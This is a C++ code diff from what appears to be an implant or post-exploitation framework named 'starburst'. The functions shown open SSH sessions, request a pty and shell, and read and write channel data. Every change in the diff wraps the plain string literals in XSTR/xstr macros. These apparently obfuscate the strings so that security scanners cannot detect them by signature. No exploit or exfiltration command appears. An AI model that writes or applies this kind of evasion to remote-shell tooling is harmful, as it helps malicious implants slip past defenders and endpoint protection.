     uint8_t* data = nullptr;
     uint32_t data_len = 0;
@@ -1920,19 +1920,19 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
 
     SshSession* sess = &st->sessions[session_idx];
     if (!sess->active || !sess->authenticated) {
-        ssh_set_error(st, "session not active/authenticated");
+        ssh_set_error(st, XSTR("session not active/authenticated"));
         return false;
     }
 
     if (!ssh_channel_open(inst, sess)) {
-        ssh_set_error(st, "channel_open failed for shell");
+        ssh_set_error(st, XSTR("channel_open failed for shell"));
         return false;
     }
 
     // Send pty-req before shell
-    const char term[] = "xterm-256color";
+    xstr(term, "xterm-256color");
     uint32_t term_len = 14;
-    const char pty_req[] = "pty-req";
+    xstr(pty_req, "pty-req");
     uint32_t pty_req_len = 7;
 
     uint32_t pty_pkt_len = 1 + 4 + 4 + pty_req_len + 1 + 4 + term_len + 4 + 4 + 4 + 4 + 4 + 1;
@@ -1956,7 +1956,7 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
 
     if (!ssh_send_packet(inst, sess, pty_pkt, pty_pkt_len)) {
         inst.heap_free(pty_pkt);
-        ssh_set_error(st, "failed to send pty-req");
+        ssh_set_error(st, XSTR("failed to send pty-req"));
         return false;
     }
     inst.heap_free(pty_pkt);
@@ -1966,8 +1966,8 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
         bool pty_ok = false;
         for (int i = 0; i < 10; i++) {
             uint8_t* resp = nullptr; uint32_t resp_len = 0;
-            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "pty-req") || !resp) {
-                ssh_set_error(st, "no response to pty-req");
+            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("pty-req")) || !resp) {
+                ssh_set_error(st, XSTR("no response to pty-req"));
                 return false;
             }
             uint8_t msg_type = resp[0];
@@ -1978,7 +1978,7 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
             }
             if (msg_type == SSH_MSG_CHANNEL_FAILURE) {
                 inst.heap_free(resp);
-                ssh_set_error(st, "pty-req denied by server");
+                ssh_set_error(st, XSTR("pty-req denied by server"));
                 return false;
             }
             if (msg_type == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9) {
@@ -1995,13 +1995,13 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
             inst.heap_free(resp);
         }
         if (!pty_ok) {
-            ssh_set_error(st, "pty-req: no success response after retries");
+            ssh_set_error(st, XSTR("pty-req: no success response after retries"));
             return false;
         }
     }
 
     // Send shell request
-    const char shell_str[] = "shell";
+    xstr(shell_str, "shell");
     uint32_t shell_str_len = 5;
 
     uint32_t sh_pkt_len = 1 + 4 + 4 + shell_str_len + 1;
@@ -2017,7 +2017,7 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
 
     if (!ssh_send_packet(inst, sess, sh_pkt, sh_pkt_len)) {
         inst.heap_free(sh_pkt);
-        ssh_set_error(st, "failed to send shell request");
+        ssh_set_error(st, XSTR("failed to send shell request"));
         return false;
     }
     inst.heap_free(sh_pkt);
@@ -2027,8 +2027,8 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
         bool shell_ok = false;
         for (int i = 0; i < 10; i++) {
             uint8_t* resp = nullptr; uint32_t resp_len = 0;
-            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "shell") || !resp) {
-                ssh_set_error(st, "no response to shell request");
+            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("shell")) || !resp) {
+                ssh_set_error(st, XSTR("no response to shell request"));
                 return false;
             }
             uint8_t msg_type = resp[0];
@@ -2039,7 +2039,7 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
             }
             if (msg_type == SSH_MSG_CHANNEL_FAILURE) {
                 inst.heap_free(resp);
-                ssh_set_error(st, "shell request denied by server");
+                ssh_set_error(st, XSTR("shell request denied by server"));
                 return false;
             }
             if (msg_type == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9) {
@@ -2056,7 +2056,7 @@ auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> b
             inst.heap_free(resp);
         }
         if (!shell_ok) {
-            ssh_set_error(st, "shell: no success response after retries");
+            ssh_set_error(st, XSTR("shell: no success response after retries"));
             return false;
         }
     }
@@ -2088,7 +2088,7 @@ auto declfn starburst::ssh_channel_write(instance& inst, uint32_t session_idx,
     // Wait for window if needed
     while (sess->remote_window < data_len && !sess->channel_closed) {
         uint8_t* resp = nullptr; uint32_t resp_len = 0;
-        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "win_wait")) break;
+        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("win_wait"))) break;
         if (resp) {
             if (resp[0] == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9)
                 sess->remote_window += get_u32(resp + 5);
@@ -2209,7 +2209,7 @@ auto declfn starburst::ssh_channel_read_nb(instance& inst, uint32_t session_idx,
         case SSH_MSG_CHANNEL_REQUEST:
             if (pkt_len > 13) {
                 uint32_t req_type_len = get_u32(pkt + 5);
-                const char exit_status_str[] = "exit-status";
+                xstr(exit_status_str, "exit-status");
                 if (req_type_len == 11 && pkt_len >= 9 + 11 + 1 + 4) {
                     bool match = true;
                     for (int i = 0; i < 11; i++) {
